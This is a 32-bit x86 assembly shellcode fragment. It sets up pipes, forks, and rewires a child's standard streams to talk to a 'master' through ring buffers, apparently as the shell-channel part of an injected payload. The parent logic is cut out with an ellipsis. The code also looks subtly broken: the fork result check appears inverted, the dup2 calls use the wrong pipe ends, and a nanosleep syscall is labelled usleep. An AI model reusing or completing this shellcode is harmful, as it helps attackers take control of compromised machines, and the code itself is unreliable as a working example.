BITS 32

;		     #   1   2   3   4   5   6
; syscall arguments: EAX EBX ECX EDX ESI EDI EBP
; syscall return: EAX

start:
	call	shcode_start
shcode_start:
	pop	ebp
	sub	ebp, shcode_start
	add	ebp, data_start

	; pipe(c2sh)
	mov	eax,42
	mov	ebx,ebp
	add	ebx,c2sh_0
	int	0x80

	cmp	eax,0
	je	child_dead

	; pipe(sh2c)
	mov	eax,42
	mov	ebx,ebp
	add	ebx,sh2c_0
	int	0x80

	cmp	eax,0
	je	child_dead

	; fork()
	mov	eax,2
	int	0x80

	cmp	eax,0
	je	parent
	jg	child			; signed compare
	jmp	child_dead

child:
	; dup2(c2sh[1], 0)   (dup to stdin)
	mov	eax,63
	mov	ebx,ebp
	add	ebx,c2sh_1
	mov	ebx, [ebx]
	xor	ecx,ecx
	int	0x80

	cmp	eax,0
	jne	leave_sh

	; dup2(sh2c[0], 1)   (dup to stdout)
	mov	eax,63
	mov	ebx,ebp
	add	ebx,sh2c_0
	mov	ebx, [ebx]
	xor	ecx,ecx
	inc	ecx
	int	0x80

	cmp	eax,0
	jne	leave_sh
	
	; dup2(sh2c[0], 2)   (dup to stderr)
	mov	eax,63
	mov	ebx,ebp
	add	ebx,sh2c_0
	mov	ebx, [ebx]
	xor	ecx,ecx
	inc	ecx
	inc	ecx
	int	0x80

	cmp	eax,0
	jne	leave_sh

parent:

;...


child_dead:
	; at most wait 2 seconds for master's ACK
	xor	eax,eax
	cmp long [ebp+child_is_dead_ACK], eax
	jne	leave_sh
	inc	eax
	inc	eax
	cmp long [ebp+child_is_dead], eax
	ja	leave_sh

	inc byte [ebp]

	; usleep(1,0):
	mov	eax, 162
	mov	ebx, ebp
	add	ebx, foo
	mov	ecx, ebx
	mov long [ebx], 1		; seconds
	mov long [ebx+4], 0		; nanoseconds
	int	0x80

	jmp	child_dead

leave_sh:
	; exit-point for BOTH parent and child
	xor	ebx,ebx
	mov	eax,ebx
	inc	eax
	int	0x80

; =============================================================================
; DATA

data_start EQU $

child_is_dead EQU $ - data_start
	db		0
child_is_dead_ACK EQU $ - data_start
	db		0
to_child_ok EQU $ - data_start
	db		1
from_child_ok EQU $ - data_start
	db		1

; ringbuffer from_master:

rfrm_writer_pos EQU $ - data_start
	db		0
rfrm_reader_pos EQU $ - data_start
	db		0

; ringbuffer to_master:

rtom_writer_pos EQU $ - data_start
	db		0
rtom_reader_pos EQU $ - data_start
	db		0

; =============================================================================
; stuff that is not required to be initialized:

; pipes to/from child:
c2sh_0 EQU $ - data_start
c2sh_1 EQU $ - data_start + 4
sh2c_0 EQU $ - data_start + 8
sh2c_1 EQU $ - data_start + 12

rfrm_buffer EQU $ - data_start + 16
rtom_buffer EQU $ - data_start + 272

foo EQU $ - data_start + 528
bar EQU $ - data_start + 532
baz EQU $ - data_start + 536
qux EQU $ - data_start + 540
